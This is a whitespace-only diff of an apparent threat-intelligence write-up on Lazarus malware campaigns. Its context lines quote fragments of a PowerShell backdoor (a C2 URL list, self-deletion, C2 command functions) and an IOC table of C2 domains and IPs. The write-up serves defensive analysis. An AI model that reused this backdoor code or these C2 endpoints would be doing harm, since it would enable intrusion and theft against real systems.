@@ -5,7 +5,7 @@
   + [HAL incident (JakyllHyde)](#HAL)
   + [OSX Malwares (OSX.Yort)](#OSX)
   + [Powershell Backdoor (PowerShell/NukeSped)](#Power)
-  + [Nuclear's plant incident (DTrack)](#Dtrack) 
+  + [Nuclear's plant incident (DTrack)](#Dtrack)
 * [Cyber kill chain](#Cyber-kill-chain)
 * [Indicators Of Compromise (IOC)](#IOC)
   + [CES 2020 incident (NukeSped)](#IOC-CES)
@@ -105,7 +105,7 @@
   <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/Maldoc_VBA_5.png">
 </p>
 <h6>The macro used is one of the macros available in the open source github tool "Macro_pack".</h6>
-<h6>The backdoor begins to do the reconnaissance actions like lists the process, system informations(Username, ComputerName ...)</h6> 
+<h6>The backdoor begins to do the reconnaissance actions like lists the process, system informations(Username, ComputerName ...)</h6>
 <p align="center">
   <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/mal_process.png">
 </p>
@@ -205,7 +205,7 @@
   <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-destroysession.png">
 </p>
  <h6>This is according with the Kaspersky analysis of Yort on the functions of the backdoor:</h6>
- <ul> 
+ <ul>
 	 <li> Set sleep time (delay between C2 interactions)</li>
 	 <li> Exit session</li>
 	 <li> Collect basic host information</li>
@@ -244,7 +244,7 @@ $global:tid=0
 $global:url="https://crabbedly.club/board.php","https://craypot.live/board.php","https://indagator.club/board.php"
 $global:nup=0
 $global:nwct=0
-``` 
+```
 <h6>The backdoor executes a while loop until that the order to destroy the session push to the value of the variable "breakvalue" at 0.</h6>
 
 ``` powershell
@@ -265,7 +265,7 @@ function main()
 }
 try{Remove-Item -Path $MyInvocation.MyCommand.Source}catch{}
 main
-``` 
+```
 
 <h6>In function of the result of the id push by the C2, this executes the following actions in the infected computer.</h6>
 
@@ -304,7 +304,7 @@ function command($url)
 	catch{}
 }
 
-``` 
+```
 
 <h6>The next bloc content the functions for copy the bytes and convert from different encoding the data.</h6>
 
@@ -321,7 +321,7 @@ function CopyBytes_UTF8($DatatoCopy,$dst,$dstOffset)
 }
 function ConverttoInt32($buffer,$Offset){ return [System.BitConverter]::ToInt32($buffer,$Offset) }
 function Get_UTF8Bytes($Data){ return [System.Text.ASCIIEncoding]::UTF8.GetBytes($Data) }
-``` 
+```
 
 <h6>The following functions are for sending and get the data from the C2. We can note that the user agent is the same that the MacOS backdoor.</h6>
 
@@ -390,7 +390,7 @@ function GetResponseC2($netobject,$mxz)
 			$r.Dispose()
 			return $byteobject2
 		}
-		else{return $null} 
+		else{return $null}
 	}
 	catch{return $null}
 }
@@ -620,7 +620,7 @@ function Set-command($buf)
 	{
 		try
 		{
-            $content=Get-Content -Path $path; 
+            $content=Get-Content -Path $path;
             Remove-Item -Path $path;
 			if($content.GetType().FullName -eq "System.Object[]")
 			{
@@ -985,7 +985,7 @@ function PulsetoC2($rid)
 |JD-HAL-Manager.doc|1A172D92638E6FDB2858DCCA7A78D4B03C424B7F14BE75C2FD479F59049BC5F9|
 |thumnail.db|26A2FA7B45A455C311FD57875D8231C853EA4399BE7B9344F2136030B2EDC4AA|
 |curiofirenze.com|Domain C2|
-|193.70.64.163|IP C2|	
+|193.70.64.163|IP C2|
 
 <h6> This can be exported as JSON format <a href="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Json/HAL.json">Export in JSON</a></h6>
 <h3> OSX Malwares (OSX.Yort) / Powershell backdoor</h3>
@@ -1052,9 +1052,9 @@ function PulsetoC2($rid)
 <h6> Originals tweets: </h6><a name="tweet"></a>
 
 * [https://twitter.com/RedDrip7/status/1186562944311517184](https://twitter.com/RedDrip7/status/1186562944311517184) <a name="Original-Tweet"></a>
-* [https://twitter.com/Rmy_Reserve/status/1188235835956551680](https://twitter.com/Rmy_Reserve/status/1188235835956551680) 
-* [https://twitter.com/a_tweeter_user/status/1188811977851887616](https://twitter.com/a_tweeter_user/status/1188811977851887616) 
-* [https://twitter.com/spider_girl22/status/1187288313285079040](https://twitter.com/spider_girl22/status/1187288313285079040) 
+* [https://twitter.com/Rmy_Reserve/status/1188235835956551680](https://twitter.com/Rmy_Reserve/status/1188235835956551680)
+* [https://twitter.com/a_tweeter_user/status/1188811977851887616](https://twitter.com/a_tweeter_user/status/1188811977851887616)
+* [https://twitter.com/spider_girl22/status/1187288313285079040](https://twitter.com/spider_girl22/status/1187288313285079040)
 * [https://twitter.com/objective_see/status/1187094701729443840](https://twitter.com/objective_see/status/1187094701729443840)
 * [https://twitter.com/TweeterCyber/status/1191391454981177344](https://twitter.com/TweeterCyber/status/1191391454981177344)
 
